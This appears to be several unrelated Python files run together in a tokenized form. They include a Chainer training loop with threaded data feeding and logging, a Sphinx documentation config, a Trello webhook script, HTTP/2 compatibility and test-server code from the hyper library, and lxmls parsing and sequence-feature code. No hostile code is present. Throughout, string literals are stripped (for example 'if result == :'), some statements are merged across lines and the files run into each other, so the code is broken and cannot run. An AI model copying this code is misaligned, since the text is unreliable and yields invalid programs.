~~~ path , label = train_list [ idx ] \n 
batch_pool [ i ] = pool . apply_async ( read_image , ( path , False , True ) ) \n 
y_batch [ i ] = label \n 
i += 1 \n 
\n 
if i == args . batchsize : \n 
~~~ for j , x in enumerate ( batch_pool ) : \n 
~~~ x_batch [ j ] = x . get ( ) \n 
~~ data_q . put ( ( x_batch . copy ( ) , y_batch . copy ( ) ) ) \n 
i = 0 \n 
\n 
~~ count += 1 \n 
if count % 1000 == 0 : \n 
~~~ data_q . put ( ) \n 
j = 0 \n 
for path , label in val_list : \n 
~~~ val_batch_pool [ j ] = pool . apply_async ( \n 
read_image , ( path , True , False ) ) \n 
val_y_batch [ j ] = label \n 
j += 1 \n 
\n 
if j == args . val_batchsize : \n 
~~~ for k , x in enumerate ( val_batch_pool ) : \n 
~~~ val_x_batch [ k ] = x . get ( ) \n 
~~ data_q . put ( ( val_x_batch . copy ( ) , val_y_batch . copy ( ) ) ) \n 
j = 0 \n 
~~ ~~ data_q . put ( ) \n 
\n 
~~ ~~ optimizer . lr *= 0.97 \n 
~~ pool . close ( ) \n 
pool . join ( ) \n 
data_q . put ( ) \n 
\n 
\n 
~~ def log_result ( ) : \n 
# Logger \n 
~~~ train_count = 0 \n 
train_cur_loss = 0 \n 
train_cur_accuracy = 0 \n 
begin_at = time . time ( ) \n 
val_begin_at = None \n 
while True : \n 
~~~ result = res_q . get ( ) \n 
if result == : \n 
~~~ print ( file = sys . stderr ) \n 
break \n 
~~ elif result == : \n 
~~~ print ( file = sys . stderr ) \n 
train = True \n 
if val_begin_at is not None : \n 
~~~ begin_at += time . time ( ) - val_begin_at \n 
val_begin_at = None \n 
~~ continue \n 
~~ elif result == : \n 
~~~ print ( file = sys . stderr ) \n 
train = False \n 
val_count = val_loss = val_accuracy = 0 \n 
val_begin_at = time . time ( ) \n 
continue \n 
\n 
~~ loss , accuracy = result \n 
if train : \n 
~~~ train_count += 1 \n 
duration = time . time ( ) - begin_at \n 
throughput = train_count * args . batchsize / duration \n 
sys . stderr . write ( \n 
\n 
. format ( train_count , train_count * args . batchsize , \n 
datetime . timedelta ( seconds = duration ) , throughput ) ) \n 
\n 
train_cur_loss += loss \n 
train_cur_accuracy += accuracy \n 
if train_count % 1000 == 0 : \n 
~~~ mean_loss = train_cur_loss / 1000 \n 
mean_error = 1 - train_cur_accuracy / 1000 \n 
print ( file = sys . stderr ) \n 
print ( json . dumps ( { : , : train_count , \n 
: mean_error , : mean_loss } ) ) \n 
sys . stdout . flush ( ) \n 
train_cur_loss = 0 \n 
train_cur_accuracy = 0 \n 
~~ ~~ else : \n 
~~~ val_count += args . val_batchsize \n 
duration = time . time ( ) - val_begin_at \n 
throughput = val_count / duration \n 
sys . stderr . write ( \n 
\n 
. format ( val_count / args . val_batchsize , val_count , \n 
datetime . timedelta ( seconds = duration ) , throughput ) ) \n 
\n 
val_loss += loss \n 
val_accuracy += accuracy \n 
if val_count == 50000 : \n 
~~~ mean_loss = val_loss * args . val_batchsize / 50000 \n 
mean_error = 1 - val_accuracy * args . val_batchsize / 50000 \n 
print ( file = sys . stderr ) \n 
print ( json . dumps ( { : , : train_count , \n 
: mean_error , : mean_loss } ) ) \n 
sys . stdout . flush ( ) \n 
\n 
\n 
~~ ~~ ~~ ~~ def train_loop ( ) : \n 
# Trainer \n 
~~~ graph_generated = False \n 
while True : \n 
~~~ while data_q . empty ( ) : \n 
~~~ time . sleep ( 0.1 ) \n 
~~ inp = data_q . get ( ) \n 
if inp == : # quit \n 
~~~ res_q . put ( ) \n 
break \n 
~~ elif inp == : # restart training \n 
~~~ res_q . put ( ) \n 
model . train = True \n 
continue \n 
~~ elif inp == : # start validation \n 
~~~ res_q . put ( ) \n 
serializers . save_hdf5 ( args . out , model ) \n 
serializers . save_hdf5 ( args . outstate , optimizer ) \n 
model . train = False \n 
continue \n 
\n 
~~ volatile = if model . train else \n 
x = chainer . Variable ( xp . asarray ( inp [ 0 ] ) , volatile = volatile ) \n 
t = chainer . Variable ( xp . asarray ( inp [ 1 ] ) , volatile = volatile ) \n 
\n 
if model . train : \n 
~~~ optimizer . update ( model , x , t ) \n 
if not graph_generated : \n 
~~~ with open ( , ) as o : \n 
~~~ o . write ( computational_graph . build_computational_graph ( \n 
( model . loss , ) ) . dump ( ) ) \n 
~~ print ( , file = sys . stderr ) \n 
graph_generated = True \n 
~~ ~~ else : \n 
~~~ model ( x , t ) \n 
\n 
~~ res_q . put ( ( float ( model . loss . data ) , float ( model . accuracy . data ) ) ) \n 
del x , t \n 
\n 
# Invoke threads \n 
~~ ~~ feeder = threading . Thread ( target = feed_data ) \n 
feeder . daemon = True \n 
feeder . start ( ) \n 
logger = threading . Thread ( target = log_result ) \n 
logger . daemon = True \n 
logger . start ( ) \n 
\n 
train_loop ( ) \n 
feeder . join ( ) \n 
logger . join ( ) \n 
\n 
# Save final model \n 
serializers . save_hdf5 ( args . out , model ) \n 
serializers . save_hdf5 ( args . outstate , optimizer ) \n 
# -*- coding: utf-8 -*- \n 
# \n 
# DJOAuth2 documentation build configuration file, created by \n 
# sphinx-quickstart on Wed Sep 11 19:31:28 2013. \n 
# \n 
# This file is execfile()d with the current directory set to its containing dir. \n 
# \n 
# Note that not all possible configuration values are present in this \n 
# autogenerated file. \n 
# \n 
# All configuration values have a default; values that are commented out \n 
# serve to show the default. \n 
\n 
import sys , os \n 
\n 
# If extensions (or modules to document with autodoc) are in another directory, \n 
# add these directories to sys.path here. If the directory is relative to the \n 
# documentation root, use os.path.abspath to make it absolute, like shown here. \n 
sys . path . insert ( 0 , os . path . abspath ( ) ) \n 
\n 
import local_settings \n 
\n 
# -- General configuration ----------------------------------------------------- \n 
\n 
# If your documentation needs a minimal Sphinx version, state it here. \n 
\n 
\n 
# Add any Sphinx extension module names here, as strings. They can be extensions \n 
\n 
extensions = [ , ] \n 
\n 
# Add any paths that contain templates here, relative to this directory. \n 
templates_path = [ ] \n 
\n 
# The suffix of source filenames. \n 
source_suffix = \n 
\n 
# The encoding of source files. \n 
\n 
\n 
# The master toctree document. \n 
master_doc = \n 
\n 
# General information about the project. \n 
project = \n 
copyright = \n 
html_show_copyright = False \n 
\n 
\n 
\n 
# |version| and |release|, also used in various other places throughout the \n 
# built documents. \n 
# \n 
# The short X.Y version. \n 
import djoauth2 \n 
version = djoauth2 . __version__ \n 
# The full version, including alpha/beta/rc tags. \n 
release = djoauth2 . __version__ \n 
\n 
# The language for content autogenerated by Sphinx. Refer to documentation \n 
# for a list of supported languages. \n 
#language = None \n 
\n 
# There are two options for replacing |today|: either, you set today to some \n 
# non-false value, then it is used: \n 
\n 
# Else, today_fmt is used as the format for a strftime call. \n 
\n 
\n 
# List of patterns, relative to source directory, that match files and \n 
# directories to ignore when looking for source files. \n 
exclude_patterns = [ ] \n 
\n 
# The reST default role (used for this markup: `text`) to use for all documents. \n 
#default_role = None \n 
\n 
\n 
#add_function_parentheses = True \n 
\n 
# If true, the current module name will be prepended to all description \n 
# unit titles (such as .. function::). \n 
#add_module_names = True \n 
\n 
# If true, sectionauthor and moduleauthor directives will be shown in the \n 
# output. They are ignored by default. \n 
#show_authors = False \n 
\n 
# The name of the Pygments (syntax highlighting) style to use. \n 
pygments_style = \n 
\n 
# A list of ignored prefixes for module index sorting. \n 
#modindex_common_prefix = [] \n 
\n 
# If true, keep warnings as "system message" paragraphs in the built documents. \n 
#keep_warnings = False \n 
\n 
\n 
# -- Options for HTML output --------------------------------------------------- \n 
\n 
# The theme to use for HTML and HTML Help pages.  See the documentation for \n 
# a list of builtin themes. \n 
html_theme = \n 
\n 
# Theme options are theme-specific and customize the look and feel of a theme \n 
# further.  For a list of options available for each theme, see the \n 
# documentation. \n 
#html_theme_options = {} \n 
\n 
# Add any paths that contain custom themes here, relative to this directory. \n 
#html_theme_path = [] \n 
\n 
# The name for this set of Sphinx documents.  If None, it defaults to \n 
# "<project> v<release> documentation". \n 
#html_title = None \n 
\n 
# A shorter title for the navigation bar.  Default is the same as html_title. \n 
#html_short_title = None \n 
\n 
# The name of an image file (relative to this directory) to place at the top \n 
# of the sidebar. \n 
#html_logo = None \n 
\n 
# The name of an image file (within the static path) to use as favicon of the \n 
# docs.  This file should be a Windows icon file (.ico) being 16x16 or 32x32 \n 
# pixels large. \n 
#html_favicon = None \n 
\n 
# Add any paths that contain custom static files (such as style sheets) here, \n 
# relative to this directory. They are copied after the builtin static files, \n 
# so a file named "default.css" will overwrite the builtin "default.css". \n 
html_static_path = [ ] \n 
\n 
\n 
# using the given strftime format. \n 
\n 
\n 
# If true, SmartyPants will be used to convert quotes and dashes to \n 
# typographically correct entities. \n 
#html_use_smartypants = True \n 
\n 
# Custom sidebar templates, maps document names to template names. \n 
#html_sidebars = {} \n 
\n 
# Additional templates that should be rendered to pages, maps page names to \n 
# template names. \n 
#html_additional_pages = {} \n 
\n 
# If false, no module index is generated. \n 
#html_domain_indices = True \n 
\n 
# If false, no index is generated. \n 
#html_use_index = True \n 
\n 
# If true, the index is split into individual pages for each letter. \n 
#html_split_index = False \n 
\n 
# If true, links to the reST sources are added to the pages. \n 
#html_show_sourcelink = True \n 
\n 
# If true, "Created using Sphinx" is shown in the HTML footer. Default is True. \n 
#html_show_sphinx = True \n 
\n 
# If true, "(C) Copyright ..." is shown in the HTML footer. Default is True. \n 
#html_show_copyright = True \n 
\n 
# If true, an OpenSearch description file will be output, and all pages will \n 
# contain a <link> tag referring to it.  The value of this option must be the \n 
# base URL from which the finished HTML is served. \n 
\n 
\n 
# This is the file name suffix for HTML files (e.g. ".xhtml"). \n 
#html_file_suffix = None \n 
\n 
# Output file base name for HTML help builder. \n 
htmlhelp_basename = \n 
\n 
\n 
# -- Options for LaTeX output -------------------------------------------------- \n 
\n 
latex_elements = { \n 
\n 
\n 
\n 
\n 
\n 
\n 
# Additional stuff for the LaTeX preamble. \n 
\n 
} \n 
\n 
# Grouping the document tree into LaTeX files. List of tuples \n 
# (source start file, target name, title, author, documentclass [howto/manual]). \n 
latex_documents = [ \n 
( , , , \n 
, ) , \n 
] \n 
\n 
# The name of an image file (relative to this directory) to place at the top of \n 
# the title page. \n 
#latex_logo = None \n 
\n 
# For "manual" documents, if this is true, then toplevel headings are parts, \n 
# not chapters. \n 
#latex_use_parts = False \n 
\n 
# If true, show page references after internal links. \n 
#latex_show_pagerefs = False \n 
\n 
# If true, show URL addresses after external links. \n 
#latex_show_urls = False \n 
\n 
# Documents to append as an appendix to all manuals. \n 
#latex_appendices = [] \n 
\n 
# If false, no module index is generated. \n 
#latex_domain_indices = True \n 
\n 
\n 
# -- Options for manual page output -------------------------------------------- \n 
\n 
# One entry per manual page. List of tuples \n 
# (source start file, name, description, authors, manual section). \n 
man_pages = [ \n 
( , , , \n 
[ ] , 1 ) \n 
] \n 
\n 
# If true, show URL addresses after external links. \n 
#man_show_urls = False \n 
\n 
\n 
# -- Options for Texinfo output ------------------------------------------------ \n 
\n 
# Grouping the document tree into Texinfo files. List of tuples \n 
# (source start file, target name, title, author, \n 
#  dir menu entry, description, category) \n 
texinfo_documents = [ \n 
( , , , \n 
, , , \n 
) , \n 
] \n 
\n 
# Documents to append as an appendix to all manuals. \n 
#texinfo_appendices = [] \n 
\n 
# If false, no module index is generated. \n 
#texinfo_domain_indices = True \n 
\n 
\n 
\n 
\n 
# If true, do not generate a @detailmenu in the "Top" node\'s menu. \n 
#texinfo_no_detailmenu = False \n 
\n 
\n 
# -- Options for Epub output --------------------------------------------------- \n 
\n 
# Bibliographic Dublin Core info. \n 
epub_title = \n 
epub_author = \n 
epub_publisher = \n 
epub_copyright = \n 
\n 
# The language of the text. It defaults to the language option \n 
# or en if the language is not set. \n 
\n 
\n 
# The scheme of the identifier. Typical schemes are ISBN or URL. \n 
\n 
\n 
# The unique identifier of the text. This can be a ISBN number \n 
# or the project homepage. \n 
\n 
\n 
# A unique identification for the text. \n 
\n 
\n 
# A tuple containing the cover image and cover page html template filenames. \n 
#epub_cover = () \n 
\n 
# A sequence of (type, uri, title) tuples for the guide element of content.opf. \n 
#epub_guide = () \n 
\n 
# HTML files that should be inserted before the pages created by sphinx. \n 
# The format is a list of tuples containing the path and title. \n 
#epub_pre_files = [] \n 
\n 
# HTML files shat should be inserted after the pages created by sphinx. \n 
# The format is a list of tuples containing the path and title. \n 
#epub_post_files = [] \n 
\n 
# A list of files that should not be packed into the epub file. \n 
#epub_exclude_files = [] \n 
\n 
# The depth of the table of contents in toc.ncx. \n 
#epub_tocdepth = 3 \n 
\n 
# Allow duplicate toc entries. \n 
#epub_tocdup = True \n 
\n 
# Fix unsupported image types using the PIL. \n 
#epub_fix_images = False \n 
\n 
# Scale large images. \n 
#epub_max_image_width = 0 \n 
\n 
\n 
\n 
\n 
# If false, no index is generated. \n 
#epub_use_index = True \n 
import asyncio \n 
\n 
from zeroservices import ZeroMQMedium , ResourceService \n 
from zeroservices . services import get_http_interface \n 
\n 
from zeroservices . discovery import UdpDiscoveryMedium \n 
\n 
\n 
if __name__ == : \n 
~~~ loop = asyncio . get_event_loop ( ) \n 
medium = ZeroMQMedium ( loop , UdpDiscoveryMedium ) \n 
service = ResourceService ( , medium ) \n 
application = get_http_interface ( service , loop , port = 5001 , allowed_origins = "*" ) \n 
application = loop . run_until_complete ( application ) \n 
loop . run_until_complete ( service . start ( ) ) \n 
loop . run_forever ( ) \n 
# -*- coding: utf-8 -*- \n 
~~ """\n    scripts.init_webhook\n    ~~~~~~~~~~~~~~~~~~~~\n\n    A simple script to manage the webhook.\n\n    :copyright: (c) 2016 by Lujeni.\n    :license: BSD, see LICENSE for more details.\n""" \n 
import argparse \n 
import sys \n 
\n 
from trello import TrelloClient \n 
from slugify import slugify \n 
\n 
from matterllo . utils import config \n 
from matterllo . utils import logger \n 
\n 
SETTINGS = config ( ) \n 
LOGGING = logger ( ) \n 
\n 
\n 
def main ( ) : \n 
~~~ try : \n 
~~~ parser = argparse . ArgumentParser ( description = "Webhook helpers" ) \n 
parser . add_argument ( , dest = , action = , help = parser . add_argument ( , dest = , action = , help = parser . add_argument ( , dest = , action = , help = \n 
args = parser . parse_args ( ) \n 
if not args . cleanup and not args . update and not args . init : \n 
~~~ print parser . print_help ( ) \n 
sys . exit ( 0 ) \n 
\n 
~~ client = TrelloClient ( api_key = SETTINGS [ ] , token = SETTINGS [ ] trello_boards = client . list_boards ( ) \n 
\n 
boards_name = [ slugify ( b [ ] ) for b in SETTINGS . get ( , { } ) . values ( ) ] \n 
\n 
# cleanup part \n 
if args . cleanup or args . init : \n 
~~~ result = [ h . delete ( ) for h in client . list_hooks ( ) ] \n 
LOGGING . info ( . format ( len ( result ) ) ) \n 
\n 
# update / init part \n 
~~ if args . update or args . init : \n 
~~~ for board in trello_boards : \n 
~~~ board_name = slugify ( board . name ) \n 
if board_name not in boards_name : \n 
~~~ continue \n 
\n 
~~ LOGGING . info ( . format ( board_name ) ) \n 
url = SETTINGS [ ] + \n 
result = client . create_hook ( url , board . id ) \n 
LOGGING . info ( . format ( board_name , result ) ) \n 
~~ ~~ ~~ except Exception as e : \n 
~~~ LOGGING . error ( . format ( e ) ) \n 
sys . exit ( 1 ) \n 
\n 
\n 
~~ ~~ if __name__ == : \n 
~~~ main ( ) \n 
# -*- coding: utf-8 -*- \n 
# flake8: noqa \n 
~~ """\nhyper/compat\n~~~~~~~~~~~~\n\nNormalizes the Python 2/3 API for internal use.\n""" \n 
from contextlib import contextmanager \n 
import sys \n 
import zlib \n 
\n 
try : \n 
~~~ from . import ssl_compat \n 
~~ except ImportError : \n 
# TODO log? \n 
~~~ ssl_compat = None \n 
\n 
~~ _ver = sys . version_info \n 
is_py2 = _ver [ 0 ] == 2 \n 
is_py2_7_9_or_later = _ver [ 0 ] >= 2 and _ver [ 1 ] >= 7 and _ver [ 2 ] >= 9 \n 
is_py3 = _ver [ 0 ] == 3 \n 
is_py3_3 = is_py3 and _ver [ 1 ] == 3 \n 
\n 
\n 
@ contextmanager \n 
def ignore_missing ( ) : \n 
~~~ try : \n 
~~~ yield \n 
~~ except ( AttributeError , NotImplementedError ) : # pragma: no cover \n 
~~~ pass \n 
\n 
~~ ~~ if is_py2 : \n 
~~~ if is_py2_7_9_or_later : \n 
~~~ import ssl \n 
~~ else : \n 
~~~ ssl = ssl_compat \n 
\n 
~~ from urllib import urlencode \n 
from urlparse import urlparse , urlsplit \n 
from itertools import imap \n 
\n 
def to_byte ( char ) : \n 
~~~ return ord ( char ) \n 
\n 
~~ def decode_hex ( b ) : \n 
~~~ return b . decode ( ) \n 
\n 
~~ def write_to_stdout ( data ) : \n 
~~~ sys . stdout . write ( data + ) \n 
sys . stdout . flush ( ) \n 
\n 
# The standard zlib.compressobj() accepts only positional arguments. \n 
~~ def zlib_compressobj ( level = 6 , method = zlib . DEFLATED , wbits = 15 , memlevel = 8 , \n 
strategy = zlib . Z_DEFAULT_STRATEGY ) : \n 
~~~ return zlib . compressobj ( level , method , wbits , memlevel , strategy ) \n 
\n 
~~ unicode = unicode \n 
bytes = str \n 
\n 
~~ elif is_py3 : \n 
~~~ from urllib . parse import urlencode , urlparse , urlsplit \n 
\n 
imap = map \n 
\n 
def to_byte ( char ) : \n 
~~~ return char \n 
\n 
~~ def decode_hex ( b ) : \n 
~~~ return bytes . fromhex ( b ) \n 
\n 
~~ def write_to_stdout ( data ) : \n 
~~~ sys . stdout . buffer . write ( data + ) \n 
sys . stdout . buffer . flush ( ) \n 
\n 
~~ zlib_compressobj = zlib . compressobj \n 
\n 
if is_py3_3 : \n 
~~~ ssl = ssl_compat \n 
~~ else : \n 
~~~ import ssl \n 
\n 
~~ unicode = str \n 
bytes = bytes \n 
# -*- coding: utf-8 -*- \n 
~~ """\ntest/server\n~~~~~~~~~~~\n\nThis module defines some testing infrastructure that is very useful for\nintegration-type testing of hyper. It works by spinning up background threads\nthat run test-defined logic while listening to a background thread.\n\nThis very-clever idea and most of its implementation are ripped off from\nAndrey Petrov\'s excellent urllib3 project. I owe him a substantial debt in\ningenuity and about a million beers. The license is available in NOTICES.\n""" \n 
\n 
import threading \n 
import socket \n 
import sys \n 
\n 
from hyper import HTTP20Connection \n 
from hyper . compat import ssl \n 
from hyper . http11 . connection import HTTP11Connection \n 
from hpack . hpack import Encoder \n 
from hpack . huffman import HuffmanEncoder \n 
from hpack . huffman_constants import ( \n 
REQUEST_CODES , REQUEST_CODES_LENGTH \n 
) \n 
from hyper . tls import NPN_PROTOCOL \n 
\n 
\n 
class SocketServerThread ( threading . Thread ) : \n 
~~~ """\n    This method stolen wholesale from shazow/urllib3 under license. See\n    NOTICES.\n\n    :param socket_handler: Callable which receives a socket argument for one\n        request.\n    :param ready_event: Event which gets set when the socket handler is\n        ready to receive requests.\n    """ \n 
def __init__ ( self , \n 
socket_handler , \n 
host = , \n 
ready_event = None , \n 
h2 = True , \n 
secure = True ) : \n 
~~~ threading . Thread . __init__ ( self ) \n 
\n 
self . socket_handler = socket_handler \n 
self . host = host \n 
self . secure = secure \n 
self . ready_event = ready_event \n 
self . daemon = True \n 
\n 
if self . secure : \n 
~~~ self . cxt = ssl . SSLContext ( ssl . PROTOCOL_SSLv23 ) \n 
if ssl . HAS_NPN and h2 : \n 
~~~ self . cxt . set_npn_protocols ( [ NPN_PROTOCOL ] ) \n 
~~ self . cxt . load_cert_chain ( certfile = , \n 
keyfile = ) \n 
\n 
~~ ~~ def _start_server ( self ) : \n 
~~~ sock = socket . socket ( ) \n 
if sys . platform != : \n 
~~~ sock . setsockopt ( socket . SOL_SOCKET , socket . SO_REUSEADDR , 1 ) \n 
\n 
~~ if self . secure : \n 
~~~ sock = self . cxt . wrap_socket ( sock , server_side = True ) \n 
~~ sock . bind ( ( self . host , 0 ) ) \n 
self . port = sock . getsockname ( ) [ 1 ] \n 
\n 
# Once listen() returns, the server socket is ready \n 
sock . listen ( 1 ) \n 
\n 
if self . ready_event : \n 
~~~ self . ready_event . set ( ) \n 
\n 
~~ self . socket_handler ( sock ) \n 
sock . close ( ) \n 
\n 
~~ def _wrap_socket ( self , sock ) : \n 
~~~ raise NotImplementedError ( ) \n 
\n 
~~ def run ( self ) : \n 
~~~ self . server = self . _start_server ( ) \n 
\n 
\n 
~~ ~~ class SocketLevelTest ( object ) : \n 
~~~ """\n    A test-class that defines a few helper methods for running socket-level\n    tests.\n    """ \n 
def set_up ( self , secure = True , proxy = False ) : \n 
~~~ self . host = None \n 
self . port = None \n 
self . secure = secure if not proxy else False \n 
self . proxy = proxy \n 
self . server_thread = None \n 
\n 
~~ def _start_server ( self , socket_handler ) : \n 
~~~ """\n        Starts a background thread that runs the given socket handler.\n        """ \n 
ready_event = threading . Event ( ) \n 
self . server_thread = SocketServerThread ( \n 
socket_handler = socket_handler , \n 
ready_event = ready_event , \n 
h2 = self . h2 , \n 
secure = self . secure \n 
) \n 
self . server_thread . start ( ) \n 
ready_event . wait ( ) \n 
\n 
self . host = self . server_thread . host \n 
self . port = self . server_thread . port \n 
self . secure = self . server_thread . secure \n 
\n 
~~ def get_connection ( self ) : \n 
~~~ if self . h2 : \n 
~~~ if not self . proxy : \n 
~~~ return HTTP20Connection ( self . host , self . port , self . secure ) \n 
~~ else : \n 
~~~ return HTTP20Connection ( , secure = self . secure , \n 
proxy_host = self . host , \n 
proxy_port = self . port ) \n 
~~ ~~ else : \n 
~~~ if not self . proxy : \n 
~~~ return HTTP11Connection ( self . host , self . port , self . secure ) \n 
~~ else : \n 
~~~ return HTTP11Connection ( , secure = self . secure , \n 
proxy_host = self . host , \n 
proxy_port = self . port ) \n 
\n 
~~ ~~ ~~ def get_encoder ( self ) : \n 
~~~ """\n        Returns a HPACK encoder set up for responses.\n        """ \n 
e = Encoder ( ) \n 
e . huffman_coder = HuffmanEncoder ( REQUEST_CODES , REQUEST_CODES_LENGTH ) \n 
return e \n 
\n 
~~ def tear_down ( self ) : \n 
~~~ """\n        Tears down the testing thread.\n        """ \n 
self . server_thread . join ( 0.1 ) \n 
~~ ~~ import numpy as np \n 
import lxmls . readers . pos_corpus as pcc \n 
from os import path \n 
import pickle \n 
\n 
corpus = pcc . PostagCorpus ( ) \n 
input_data = path . join ( \n 
path . dirname ( __file__ ) , \n 
"../../data/train-02-21.conll" ) \n 
train_seq = corpus . read_sequence_list_conll ( input_data , max_sent_len = 15 , max_nr_sent = 1000 ) \n 
\n 
pickle . dump ( ( corpus . word_dict , corpus . tag_dict ) , open ( , ) ) \n 
\n 
with open ( , ) as output : \n 
~~~ for seq in train_seq : \n 
~~~ words = [ corpus . word_dict . get_label_name ( seq . x [ i ] ) for i in xrange ( len ( seq ) ) ] \n 
tags = [ corpus . tag_dict . get_label_name ( seq . y [ i ] ) for i in xrange ( len ( seq ) ) ] \n 
s = . join ( [ . join ( [ word , tag ] ) for word , tag in zip ( words , tags ) ] ) \n 
output . write ( s + ) \n 
\n 
\n 
~~ ~~ import sys \n 
import numpy as np \n 
from lxmls . parsing . dependency_reader import * \n 
from lxmls . parsing . dependency_writer import * \n 
from lxmls . parsing . dependency_features import * \n 
from lxmls . parsing . dependency_decoder import * \n 
from lxmls . util . my_math_utils import * \n 
\n 
class DependencyParser ( ) : \n 
~~~ \n 
def __init__ ( self ) : \n 
~~~ self . trained = False \n 
self . projective = False \n 
self . language = "" \n 
self . weights = [ ] \n 
self . decoder = DependencyDecoder ( ) \n 
self . reader = DependencyReader ( ) \n 
self . writer = DependencyWriter ( ) \n 
self . features = DependencyFeatures ( ) \n 
\n 
~~ def read_data ( self , language ) : \n 
~~~ self . language = language \n 
self . reader . load ( language ) \n 
self . features . create_dictionary ( self . reader . train_instances ) \n 
\n 
~~ def train_perceptron ( self , n_epochs ) : \n 
~~~ \n 
self . weights = np . zeros ( self . features . n_feats ) \n 
total = np . zeros ( self . features . n_feats ) \n 
for epoch in range ( n_epochs ) : \n 
~~~ print "Epoch {0}" . format ( epoch + 1 ) \n 
n_mistakes = 0 \n 
n_tokens = 0 \n 
n_instances = 0 \n 
for instance in self . reader . train_instances : \n 
~~~ feats = self . features . create_features ( instance ) \n 
scores = self . features . compute_scores ( feats , self . weights ) \n 
if self . projective : \n 
~~~ heads_pred = self . decoder . parse_proj ( scores ) \n 
~~ else : \n 
~~~ heads_pred = self . decoder . parse_nonproj ( scores ) \n 
\n 
~~ for m in range ( np . size ( heads_pred ) ) : \n 
~~~ if heads_pred [ m ] != instance . heads [ m ] : # mistake \n 
~~~ for f in feats [ instance . heads [ m ] ] [ m ] : \n 
~~~ if f < 0 : \n 
~~~ continue \n 
~~ self . weights [ f ] += 1.0 \n 
~~ for f in feats [ heads_pred [ m ] ] [ m ] : \n 
~~~ if f < 0 : \n 
~~~ continue \n 
~~ self . weights [ f ] -= 1.0 \n 
~~ n_mistakes += 1 \n 
~~ n_tokens += 1 \n 
~~ n_instances += 1 \n 
~~ print "Training accuracy: {0}" . format ( np . double ( n_tokens - n_mistakes ) / np . double ( n_tokens total += self . weights \n 
\n 
~~ self . weights = total / np . double ( n_epochs ) \n 
\n 
~~ def train_crf_sgd ( self , n_epochs , sigma , eta0 = 0.001 ) : \n 
~~~ \n 
self . weights = np . zeros ( self . features . n_feats ) \n 
t = 0 \n 
t0 = 1.0 / ( sigma * eta0 ) \n 
for epoch in range ( n_epochs ) : \n 
~~~ print "Epoch {0}" . format ( epoch + 1 ) \n 
n_mistakes = 0 \n 
n_tokens = 0 \n 
n_instances = 0 \n 
objective = 0.0 \n 
for instance in self . reader . train_instances : \n 
~~~ eta = 1.0 / ( sigma * ( t + t0 ) ) \n 
feats = self . features . create_features ( instance ) \n 
scores = self . features . compute_scores ( feats , self . weights ) \n 
\n 
# Compute marginals and log-partition function, and move away from that direction \n 
marginals , logZ = self . decoder . parse_marginals_nonproj ( scores ) \n 
self . weights -= eta * sigma * self . weights # Scale the weight vector \n 
for h in range ( np . size ( marginals , 0 ) ) : \n 
~~~ for m in range ( 1 , np . size ( marginals , 1 ) ) : \n 
~~~ if feats [ h ] [ m ] == None : \n 
~~~ continue \n 
~~ for f in feats [ h ] [ m ] : \n 
~~~ if f < 0 : \n 
~~~ continue \n 
~~ self . weights [ f ] -= eta * marginals [ h , m ] \n 
\n 
# Compute score of the correct parse, and move the weight vector towards that direction.  ~~ ~~ ~~ score_corr = 0.0 \n 
for m in range ( 1 , np . size ( instance . heads ) ) : \n 
~~~ h = instance . heads [ m ] \n 
score_corr += scores [ h , m ] \n 
for f in feats [ h ] [ m ] : \n 
~~~ if f < 0 : \n 
~~~ continue \n 
~~ self . weights [ f ] += eta \n 
\n 
# Compute objective (w.r.t. this instance only) \n 
~~ ~~ objective += 0.5 * sigma * np . dot ( self . weights , self . weights ) - score_corr + logZ \n 
\n 
n_instances += 1 \n 
t += 1 \n 
\n 
~~ print "Training objective: {0}" . format ( objective / n_instances ) \n 
\n 
\n 
~~ ~~ def test ( self ) : \n 
~~~ n_mistakes = 0 \n 
n_tokens = 0 \n 
n_instances = 0 \n 
arr_heads_pred = [ ] ; \n 
for instance in self . reader . test_instances : \n 
~~~ feats = self . features . create_features ( instance ) \n 
scores = self . features . compute_scores ( feats , self . weights ) \n 
if self . projective : \n 
~~~ heads_pred = self . decoder . parse_proj ( scores ) \n 
~~ else : \n 
~~~ heads_pred = self . decoder . parse_nonproj ( scores ) \n 
\n 
~~ for m in range ( np . size ( heads_pred ) ) : \n 
~~~ if heads_pred [ m ] != instance . heads [ m ] : # mistake \n 
~~~ for f in feats [ instance . heads [ m ] ] [ m ] : \n 
~~~ if f < 0 : \n 
~~~ continue \n 
~~ ~~ for f in feats [ heads_pred [ m ] ] [ m ] : \n 
~~~ if f < 0 : \n 
~~~ continue \n 
~~ ~~ n_mistakes += 1 \n 
~~ n_tokens += 1 \n 
~~ n_instances += 1 \n 
arr_heads_pred . append ( heads_pred ) \n 
~~ print "Test accuracy ({0} test instances): {1}" . format ( n_instances , np . double ( n_tokens - n_mistakes \n 
self . writer . save ( self . language , arr_heads_pred ) \n 
~~ ~~ from lxmls . sequences . label_dictionary import * \n 
import pdb \n 
\n 
################# \n 
### Replicates the same features as the HMM \n 
### One for word/tag and tag/tag pair \n 
################# \n 
class IDFeatures : \n 
~~~ \n 
\n 
def __init__ ( self , dataset ) : \n 
~~~ \n 
self . feature_dict = LabelDictionary ( ) \n 
self . feature_list = [ ] \n 
\n 
self . add_features = False \n 
self . dataset = dataset \n 
\n 
#Speed up \n 
self . node_feature_cache = { } \n 
self . initial_state_feature_cache = { } \n 
self . final_state_feature_cache = { } \n 
self . edge_feature_cache = { } \n 
\n 
\n 
~~ def get_num_features ( self ) : \n 
~~~ return len ( self . feature_dict ) \n 
\n 
\n 
~~ def build_features ( self ) : \n 
~~~ \n 
self . add_features = True \n 
for sequence in self . dataset . seq_list : \n 
~~~ initial_features , transition_features , final_features , emission_features = self . get_sequence_features ( sequence ) \n 
self . feature_list . append ( [ initial_features , transition_features , final_features , emission_features ~~ self . add_features = False \n 
\n 
~~ def get_sequence_features ( self , sequence ) : \n 
~~~ \n 
emission_features = [ ] \n 
initial_features = [ ] \n 
transition_features = [ ] \n 
final_features = [ ] \n 
\n 
## Take care of first position \n 
features = [ ] \n 
features = self . add_initial_features ( sequence , sequence . y [ 0 ] , features ) \n 
initial_features . append ( features ) \n 
\n 
## Take care of middle positions \n 
for pos , tag in enumerate ( sequence . y ) : \n 
~~~ features = [ ] \n 
features = self . add_emission_features ( sequence , pos , sequence . y [ pos ] , features ) \n 
emission_features . append ( features ) \n 
\n 
if pos > 0 : \n 
~~~ prev_tag = sequence . y [ pos - 1 ] \n 
features = [ ] \n 
features = self . add_transition_features ( sequence , pos - 1 , tag , prev_tag , features ) transition_features . append ( features ) \n 
\n 
## Take care of final position \n 
~~ ~~ features = [ ] \n 
